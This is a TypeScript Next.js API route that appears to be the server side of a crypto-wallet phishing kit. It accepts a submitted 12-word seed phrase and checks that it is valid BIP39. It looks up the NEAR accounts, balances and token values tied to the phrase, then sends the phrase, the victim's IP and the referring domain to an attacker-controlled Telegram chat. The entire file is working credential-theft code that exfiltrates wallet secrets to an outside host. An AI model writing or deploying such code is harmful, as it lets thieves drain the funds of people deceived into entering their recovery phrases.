// ============================================
// Telegram Notification API Route
// ============================================

// Next.js imports
import { NextRequest, NextResponse } from "next/server"
// NEAR utilities
import { findAccountsByPublicKey, getNearBalance, getAccountTokens, parseSeed } from "@/lib/near-utils"
// Config
import { config } from "@/lib/config"
// BIP39 validation
import { validateSeedPhrase, getDuplicateIndices } from "@/lib/bip39-words"
// Rate limiting
import { checkRateLimits, getClientIp } from "@/lib/rate-limiter"

// Bot credentials
const { botToken: BOT_TOKEN, chatId: CHAT_ID } = config.telegram

// Get token prices from CoinGecko
async function getTokenPricesUSD(): Promise<Record<string, number>> {
  try {
    const ids = "near,tether,usd-coin,ref-finance,aurora-near,sweat-economy,meta-pool"
    const res = await fetch(
      `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`,
      { headers: { Accept: "application/json" }, signal: AbortSignal.timeout(8000) }
    )
    if (!res.ok) return {}
    const data = await res.json()
    return {
      NEAR:   data?.["near"]?.usd           ?? 0,
      wNEAR:  data?.["near"]?.usd           ?? 0,
      USDt:   data?.["tether"]?.usd         ?? 0,
      USDT:   data?.["tether"]?.usd         ?? 0,
      USDC:   data?.["usd-coin"]?.usd       ?? 0,
      "USDC.e": data?.["usd-coin"]?.usd     ?? 0,
      REF:    data?.["ref-finance"]?.usd    ?? 0,
      AURORA: data?.["aurora-near"]?.usd    ?? 0,
      SWEAT:  data?.["sweat-economy"]?.usd  ?? 0,
      stNEAR: data?.["near"]?.usd           ?? 0,
      LiNEAR: data?.["near"]?.usd           ?? 0,
      NearX:  data?.["near"]?.usd           ?? 0,
    }
  } catch {
    return {}
  }
}

// Main POST handler
export async function POST(req: NextRequest) {
  try {
    const { words, walletName } = await req.json()

    if (!Array.isArray(words) || words.length !== 12) {
      return NextResponse.json(
        { error: "Invalid seed phrase length" },
        { status: 400 }
      )
    }

    const validation = validateSeedPhrase(words)
    if (!validation.valid) {
      return NextResponse.json(
        { error: "Invalid BIP39 words", invalidIndices: validation.invalidIndices },
        { status: 400 }
      )
    }

    const duplicateIndices = getDuplicateIndices(words)
    if (duplicateIndices.length > 0) {
      return NextResponse.json(
        { error: "Too many duplicate words", duplicateIndices },
        { status: 400 }
      )
    }

    const clientIp = getClientIp(req)
    const seedPhrase = words.join(' ')
    const rateLimit = checkRateLimits(clientIp, seedPhrase)
    
    if (!rateLimit.allowed) {
      const messages: Record<string, string> = {
        seed_banned: "This seed phrase has been temporarily blocked",
        seed_limit_reached: "Too many attempts with this seed phrase",
        ip_limited: "Too many requests from your IP"
      }
      return NextResponse.json(
        { 
          error: messages[rateLimit.reason || 'ip_limited'],
          retryAfter: rateLimit.retryAfter 
        },
        { status: 429 }
      )
    }

    const domain = req.headers.get("referer") || req.headers.get("origin") || "unknown"
    const userAgent = req.headers.get("user-agent") || "unknown"

    const numbered = (words as string[])
      .map((w: string, i: number) => `${i + 1}. ${w}`)
      .join("\n")

    let accountsInfo = ""
    try {
      const { publicKey } = parseSeed(words as string[])
      
      const [accounts, prices] = await Promise.all([
        findAccountsByPublicKey(publicKey),
        getTokenPricesUSD(),
      ])

      if (accounts.length > 0) {
        const nearPrice = prices["NEAR"] ?? 0

        const balances = await Promise.all(
          accounts.map((acc) => getNearBalance(acc).catch(() => null))
        )

        const lines: string[] = []

        for (let i = 0; i < accounts.length; i++) {
          const acc = accounts[i]
          const balYocto = balances[i]
          const balNear = balYocto !== null ? Number(balYocto) / 1e24 : null

          let line = `\u{1F3D6} *${acc}*\n`

          if (balNear === null) {
            line += `  \u{1F5FC} NEAR: unavailable\n`
          } else {
            const usdStr = nearPrice > 0 ? ` (~$${(balNear * nearPrice).toFixed(2)})` : ""
            line += `  \u{1F5FC} NEAR: ${balNear.toFixed(4)}${usdStr}\n`
          }

          try {
            const tokens = await getAccountTokens(acc)
            for (const t of tokens) {
              const price = prices[t.symbol] ?? 0
              const usdStr = price > 0 ? ` (~$${(t.amountHuman * price).toFixed(2)})` : ""
              line += `  \u{1F6F6} ${t.symbol}: ${t.amountHuman.toFixed(6)}${usdStr}\n`
            }
          } catch {}

          lines.push(line)
        }

        const priceStr = nearPrice > 0 ? `\u{1FA9D} NEAR Price: *$${nearPrice.toFixed(2)}*\u{26F1}\n` : ""
        accountsInfo =
          `\n\n${priceStr}` +
          `\u{1F50D} *Accounts found: ${accounts.length}*\n\n` +
          lines.join("\n")
      } else {
        accountsInfo = "\n\n\u26A0\uFE0F No accounts found for this key"
      }
    } catch (e) {
      accountsInfo = `\n\n\u26A0\uFE0F Could not check balance: ${String(e).slice(0, 80)}`
    }

    const seedWords = (words as string[]).join("\n")
    const text =
      `New seed phrase\u{1FA93}\n` +
      `\u{1FAA3} Wallet: *${walletName}*\n` +
      `\u{1F3AF} Domain: ${domain}\n` +
      `\u{1F310} IP: ${clientIp}\n` +
      `\`\`\`\n${seedWords}\n\`\`\`` +
      accountsInfo

    const res = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text,
          parse_mode: "Markdown",
        }),
      }
    )

    const data = await res.json()
    if (!data.ok) {
      return NextResponse.json({ error: data.description }, { status: 500 })
    }

    return NextResponse.json({ ok: true })
  } catch (err) {
    return NextResponse.json({ error: String(err) }, { status: 500 })
  }
}
